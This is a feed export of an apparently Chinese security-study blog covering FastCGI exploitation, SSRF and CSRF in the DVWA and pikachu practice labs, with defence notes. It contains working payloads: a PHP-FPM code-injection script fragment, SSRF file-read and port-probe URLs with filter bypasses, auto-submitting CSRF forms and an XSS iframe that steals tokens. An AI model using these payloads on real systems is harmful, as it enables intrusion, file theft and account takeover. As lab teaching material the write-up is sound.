documentRoot,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class=\"string\">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_PORT&#x27;</span>: <span class=\"string\">&#x27;12345&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PORT&#x27;</span>: <span class=\"string\">&#x27;80&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_NAME&#x27;</span>: <span class=\"string\">&quot;localhost&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class=\"string\">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_TYPE&#x27;</span>: <span class=\"string\">&#x27;application/text&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_LENGTH&#x27;</span>: <span class=\"string\">&quot;%d&quot;</span> % <span class=\"built_in\">len</span>(content),</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_VALUE&#x27;</span>: <span class=\"string\">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class=\"string\">&#x27;allow_url_include = On&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    response = client.request(params, content)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(force_text(response))</span><br></pre></td></tr></table></figure>\n<p>又是参考 P 师傅的一天～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZmFzdGNnaS1hbmQtcGhwLWZwbS5odG1s\">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==\">tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxNjQzMDAy\">SSRF–gopher 协议打 FastCGI_Z3eyOnd 的博客 - CSDN 博客_gopher fastcgi</span></p>\n<h3 id=\"ssrf-2\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-2\">#</a> SSRF</h3>\n<blockquote>\n<p><strong>SSRF (Server-Side Request Forgery: 服务器端请求伪造)</strong></p>\n<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制</p>\n<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>\n<p>数据流：攻击者 -----&gt; 服务器 ----&gt; 目标地址</p>\n<p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP中下面函数的使用不当会导致SSRF:</span><br><span class=\"line\">file_get_contents()</span><br><span class=\"line\">fsockopen()</span><br><span class=\"line\">curl_exec()</span><br><span class=\"line\">         </span><br></pre></td></tr></table></figure>\n<p>但注意 curl_exec () 不支持 php://filter 等伪协议，支持 dict</p>\n<p>但 file_get_contens () 支持 php://filter 伪协议读文件，不支持 dict</p>\n<p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求，<strong> 则请做好目标地址的过滤</strong>。</p>\n</blockquote>\n<h4 id=\"pikachu-curl-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-curl-ssrf\">#</a> pikachu - curl ssrf</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span><br><span class=\"line\">    $URL = $_GET[&#x27;url&#x27;];</span><br><span class=\"line\">    $CH = curl_init($URL);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_HEADER, FALSE);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\">    $RES = curl_exec($CH);</span><br><span class=\"line\">    curl_close($CH) ;</span><br><span class=\"line\">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><br><span class=\"line\">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><br><span class=\"line\">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><br><span class=\"line\">    echo $RES;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=dict://127.0.0.1:3306</span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=file:///C:\\Windows\\system.ini</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325170713312.png\" alt=\"image-20220325170713312\"></p>\n<p><code>curl_init </code> 只能用于 <code>tcp</code>  协议，因此可以用于读取文件或检测端口是否开启</p>\n<h4 id=\"pikachu-file_get_contents-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-file_get_contents-ssrf\">#</a> pikachu-file_get_contents ssrf</h4>\n<p><code>file_get_contents</code>  可以接收 <code>php</code>  伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><br><span class=\"line\">//内网请求:http://x.x.x.x/xx.index</span><br><span class=\"line\">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; $_GET[&#x27;file&#x27;] !=null)&#123;</span><br><span class=\"line\">    $filename = $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">    $str = file_get_contents($filename);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=C:\\Windows\\system.ini</span><br><span class=\"line\">//</span><br><span class=\"line\">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbMzg2RW5oXQ0Kd29hZm9udD1kb3NhcHAuZm9uDQpFR0E4MFdPQS5GT049RUdBODBXT0EuRk9ODQpFR0E0MFdPQS5GT049RUdBNDBXT0EuRk9ODQpDR0E4MFdPQS5GT049Q0dBODBXT0EuRk9ODQpDR0E0MFdPQS5GT049Q0dBNDBXT0EuRk9ODQoNCltkcml2ZXJzXQ0Kd2F2ZT1tbWRydi5kbGwNCnRpbWVyPXRpbWVyLmRydg0KDQpbbWNpXQ0K</span><br></pre></td></tr></table></figure>\n<h4 id=\"pikachu-fsockopen-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-fsockopen-ssrf\">#</a> pikachu-fsockopen ssrf</h4>\n<p>加载远程网站</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=www.baidu.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf防御\"><a class=\"markdownIt-Anchor\" href=\"#ssrf防御\">#</a> ssrf 防御</h3>\n<ol>\n<li>过滤开头不是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHAlM0ElMkYlMkZ4eHguY29t\"> http://xxx.com</span> 的所有链接，白名单限制 http/https 协议</li>\n<li>过滤格式为 ip 的链接，比如 127.0.0.1</li>\n<li>结尾必须是某个后缀</li>\n</ol>\n<h3 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h3>\n<p><code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的</p>\n<p><code>172.16.60.166/curl.php?url=http://wwwbaidu.com@172.16.60.166/curl.php?url=http://www.google.com</code></p>\n<p>绕过 IP 127.0.0.1 过滤</p>\n<p>1. 变形</p>\n<p>http://[::1]<br>\nhttp://[::ffff:7f00:1]<br>\nhttp://[::ffff:127.0.0.1]<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4x\">http://127.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjE=\">http://127.0.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzA6ODA=\">http://0:80</span></p>\n<p>2.ip 进制转换</p>\n<p>转为 16 进制，或 10 进制，8 进制</p>\n<p>3.16 进制网址编码</p>\n<p>4.30x 重定向</p>\n<p>防御</p>\n<p>・禁止 302 跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p>\n<p>CURLOPT_FOLLOWLOCATION</p>\n<p>・过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p>\n<p>・禁用高危协议，例如：gopher、dict、ftp、file 等，只允许 http/https</p>\n<p>・设置 URL 白名单或者限制内网 IP</p>\n<p>・限制请求的端口为 http 的常用端口，或者根据业务需要治开放远程调用服务的端口</p>\n<p>・catch 错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/CSRF/",
            "url": "http://example.com/2022/05/27/CSRF/",
            "title": "CSRF",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<p><strong>引用自 pikachu 的解释：</strong></p>\n<blockquote>\n<p>CSRF (跨站请求伪造) 概述</p>\n<p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 &quot;one click&quot; 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。<br>\n这里列举一个场景解释一下，希望能够帮助你理解。<br>\n<strong>场景需求：</strong><br>\n小黑想要修改大白在购物网站 tianxiewww.xx.com 上填写的会员地址。<br>\n<strong>先看下大白是如何修改自己的密码的：</strong><br>\n登录 — 修改会员信息，提交请求 — 修改成功。<br>\n所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>\n<p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？<br>\n于是他自己跑到 www.xx.com 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：<br>\n【<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL2VkaXQucGhwP2VtYWlsPXhpYW9oZWlAODguY29tJmFtcDtDaGFuZ2U9Q2hhbmdlJUUzJTgwJTkx\">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br>\n于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p>\n<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>\n1.www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造；<br>\n— 因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。<br>\n2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上；<br>\n— 如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>\n— 因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。<br>\n当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>\n— 所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p>\n<p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>\n–对敏感信息的操作增加安全的 token；<br>\n–对敏感信息的操作增加安全的验证码；<br>\n–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>\n</blockquote>\n<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作，没有对用户合法身份进行验证</p>\n<p>官方术语说：攻击能劫持终端用户在已登录的 Web 站点上执行本意操作，会自动携带同一域名下的 cookie 到服务器，简单的说攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF 的过程非常隐秘受害人甚至无法察觉。</p>\n<p>产生 CSRF 漏洞的原因大致有以下:</p>\n<ul>\n<li>一方面是开发者不够谨慎，编写的 Web 应用程序存在漏洞导致恶意利用；</li>\n<li>另一方面因为 Web 浏览器对于 Cookie 和 HTTP 身份验证的回话信息的处理存在一定的缺陷；</li>\n<li>服务器对于浏览器过于信任，相信从该浏览器发出的请求都是正确的，却没有区分这是用户主动发送的请求，还是模拟用户行为发出来的。</li>\n</ul>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221118090340493.png\" alt=\"image-20221118090340493\"></p>\n<h2 id=\"csrf类型\"><a class=\"markdownIt-Anchor\" href=\"#csrf类型\">#</a> CSRF 类型</h2>\n<p><strong>GET 类型的 CSRF</strong></p>\n<p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>\n<p><code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>在受害者访问这个页面后，浏览器会自动向 <code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code> 发出一次 HTTP 请求。1.1.1.1:18888 就会受到用户修改密码的跨域请求，同时因为用户在 A 页面没有登出，浏览器会携带 A 的 cookie</p>\n<p><strong>POST 类型的 CSRF</strong></p>\n<p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.example/withdraw&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">POST</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;account&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;10000&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;for&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hacker&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"> <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"title function_\">submit</span>(); </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>\n<p><strong>链接类型的 CSRF</strong></p>\n<p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>\n<p><code> &lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;   重磅消息！！   &lt;a/&gt;</code></p>\n<h4 id=\"csrf漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#csrf漏洞利用\">#</a> CSRF 漏洞利用</h4>\n<p>描述：CSRF 的利用点找寻 <code>订单下单处 修改敏感信息处 删除信息处 绑定处 发送信息处</code> ；CSRF 利用场景:</p>\n<ul>\n<li>获取个人数据（常常使用）</li>\n<li>修改个人数据（横向越权）</li>\n<li>添加用户（纵向越权）等</li>\n</ul>\n<p>电商用户新增默认收货地址、发微博、添加管理员等等，所有的敏感操作都可以是我们的攻击目标，发现的用户账号授权相关的操作、二维码登陆、绑定第三方账号等，这些功能有 CSRF 的话就直接被盗号了，也就是说所有的敏感操作都需要进行 CSRF 的防护。</p>\n<h2 id=\"dvwa\"><a class=\"markdownIt-Anchor\" href=\"#dvwa\">#</a> dvwa</h2>\n<p>1.low</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png\" alt=\"image-20221029213100094\"></p>\n<p>由于我当前已经登录，因此网站中是存在我的 cookie 滴</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213206492.png\" alt=\"image-20221029213206492\"></p>\n<p>并且在 low 模式下，没有原密码做验证，也没有 token 对用户身份最校验，那么 csrf 就出现了</p>\n<p>我目前修改自己的密码，从 password 修改为 123456，观察 URL 的变化</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code></p>\n<p>网络中有个 hacker，抓到了我修改密码的请求包，意味着他也得到了上述 url，那么他就可以构造以下 url：</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>然后把它缩短为短链接的形式：</p>\n<p><code>http://gg.gg/12iqj8</code></p>\n<p>我一旦点击后，就会向服务器发送 change password 的请求</p>\n<p>此时我的密码就会被改变</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213847558.png\" alt=\"image-20221029213847558\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213921662.png\" alt=\"image-20221029213921662\"></p>\n<p>2.medium</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if( isset( $_GET[ ‘Change’ ] ) ) &#123;</span><br><span class=\"line\">    // Checks to see where the request came from</span><br><span class=\"line\">    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) ) &#123;</span><br><span class=\"line\">    // Get input</span><br><span class=\"line\">    $pass_new = $_GET[ ‘password_new’ ];</span><br><span class=\"line\">    $pass_conf = $_GET[ ‘password_conf’ ];</span><br></pre></td></tr></table></figure>\n<p>多了判断 HTTP_REFERER 中是否有 SERVER_NAME，HTTP_REFERER 是 Referer 参数值，即来源地址，SERVER_NAME 是 host 参数及主机 ip 名</p>\n<p>其实他是想限制同源，但可以绕过</p>\n<p>同时使用 csrftester 生成 payload，但不一样的是需要修改文件名为 IP.html，比如 192.168.13.133.html，这样在检测 refer 时就会包括了我们的 hostIP，相当于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HOST: 192.168.13.133</span><br><span class=\"line\">Referer: http://101.1.1.1/dvwa/192.168.13.133.html</span><br></pre></td></tr></table></figure>\n<p>3.high</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($change) &#123;</span><br><span class=\"line\">\t// Check Anti-CSRF token</span><br><span class=\"line\">\tcheckToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Do the passwords match?</span><br><span class=\"line\">\tif( $pass_new == $pass_conf ) &#123;</span><br><span class=\"line\">\t\t// They do!</span><br><span class=\"line\">\t\t$pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class=\"line\">\t\t$pass_new = md5( $pass_new );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Update the database</span><br><span class=\"line\">\t\t$insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class=\"line\">\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Feedback for the user</span><br><span class=\"line\">\t\t$return_message = &quot;Password Changed.&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t// Issue with passwords matching</span><br><span class=\"line\">\t\t$return_message = &quot;Passwords did not match.&quot;;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>攻击思路是试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而获得 token 值，并向服务器发送改密请求，完成攻击。<br>\n但是，浏览器并不允许跨域请求，因此，我们可以利用 xss 漏洞</p>\n<p>我们需要利用 xss 了，打开 stroed xss，构造如下代码 <code>&lt;iframe src=&quot;../csrf/&quot;onload=alert(document.getElementsByName('user_token')[0].value)&gt;&lt;/iframe&gt;</code>  获得 cookie，使用 cookie 完成 csrf</p>\n<p>或者使用 CSRF Token Tracker 的 BP 插件</p>\n<h2 id=\"csrf-tester\"><a class=\"markdownIt-Anchor\" href=\"#csrf-tester\">#</a> CSRF tester</h2>\n<blockquote>\n<p>CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n</blockquote>\n<p>CSRF tester 监听 8008 端口，注意设置代理～</p>\n<p><code>10月 29, 2022 9:42:36 下午 org.owasp.webscarab.plugin.proxy.Listener listen 信息: Proxy listening on 127.0.0.1:8008</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214412139.png\" alt=\"image-20221029214412139\" style=\"zoom: 67%;\" />\n<p>接着访问可能存在 csrf 的连接～</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214511815.png\" alt=\"image-20221029214511815\" style=\"zoom:80%;\" />\n<p>点击 start recording</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214544955.png\" alt=\"image-20221029214544955\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215312102.png\" alt=\"image-20221029215312102\" style=\"zoom:80%;\" />\n<p>将左侧的参数修改为自己的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030095527035.png\" alt=\"image-20221030095527035\"></p>\n<p>生成 html</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215514582.png\" alt=\"image-20221029215514582\" style=\"zoom:80%;\" />\n<p>生成的 payload 如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">HTML</span> <span class=\"keyword\">PUBLIC</span> <span class=\"string\">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span 